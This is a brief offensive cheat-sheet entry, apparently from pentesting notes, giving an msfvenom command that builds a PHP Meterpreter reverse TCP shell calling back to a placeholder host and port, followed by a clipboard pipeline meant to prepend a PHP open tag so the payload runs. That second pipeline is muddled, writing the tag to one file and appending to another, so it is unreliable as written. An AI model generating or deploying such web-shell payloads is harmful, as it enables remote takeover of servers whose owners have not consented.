# PHP

PHP meterpreter reverse callback shell.

```
$ msfvenom -p php/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o met.php
```

After generating the PHP meterpreter reverse callback shell include the tags to ensure execution.

```
$ xclip -selection clipboard met.php && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php
```